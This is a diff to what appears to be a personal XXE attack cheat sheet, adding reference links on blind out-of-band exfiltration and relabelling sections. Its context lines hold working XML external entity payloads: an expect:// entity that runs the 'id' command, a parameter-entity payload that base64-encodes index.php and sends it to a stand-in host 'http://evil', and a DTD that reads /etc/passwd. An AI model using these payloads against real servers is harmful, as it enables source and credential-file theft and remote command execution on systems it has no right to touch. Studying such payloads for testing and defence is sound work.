@@ -29,6 +29,10 @@ http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-injectio
 # cheat sheet
 http://web-in-security.blogspot.com.au/2016/03/xxe-cheat-sheet.html
 
+# blind xxe exfil via oob or error msg
+https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
+https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
+
 # validate xml
 http://www.xmlvalidation.com/index.php
 
@@ -63,14 +67,14 @@ can upload any format not just zip
 # can RCE if expect module is installed and loaded (not by default)
 <!ENTITY a SYSTEM 'expect://id'>
 
-# exfil
+# oob exfil
 payload:
 <!DOCTYPE meh [<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"><!ENTITY % dtd SYSTEM "http://evil/send.dtd">%dtd;%send;]]>
 
 send.dtd:
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">%all;
 
-# exfil2
+# oob exfil 2
 payload:
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -130,7 +134,6 @@ join.dtd contains:
 dtd-part:
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///"%three;"'>">
-
 
 # facebook xxe via OpenID
 https://www.sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/
